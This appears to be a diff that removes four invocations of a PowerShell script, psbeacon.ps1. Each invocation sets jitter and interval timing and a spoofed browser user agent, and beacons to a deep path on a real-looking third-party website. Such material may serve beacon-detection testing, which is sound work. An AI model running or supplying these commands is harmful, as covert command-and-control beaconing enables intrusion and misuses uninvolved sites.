@@ -1,4 +1,0 @@
-.\psbeacon.ps1 -c 20 -jitter .25 -interval 60 -domain http://zanschool.org/sites-locations/wp-content/themes/school-dark-1/images/icons/large/ -useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-.\psbeacon.ps1 -c 40 -jitter .1 -interval 30 -domain http://firstratefinancialservices.com/wp-content/uploads/2019/06/b4287f22081c/5216937c1-41b52b7b9c5e9-39e5391ece/ -useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-.\psbeacon.ps1 -c 8 -jitter .1 -interval 240 -domain http://healthmattershc.com/articles/health_and_wellness_2019_survey/data/archived/d7cfb9fe/ -useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-.\psbeacon.ps1 -c 10 -jitter 0 -interval 180 -domain http://firstlowndesbank.com/portals/1/activemodules/dfzPlus/Shared/jsinclude/themes/base/images/ -useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
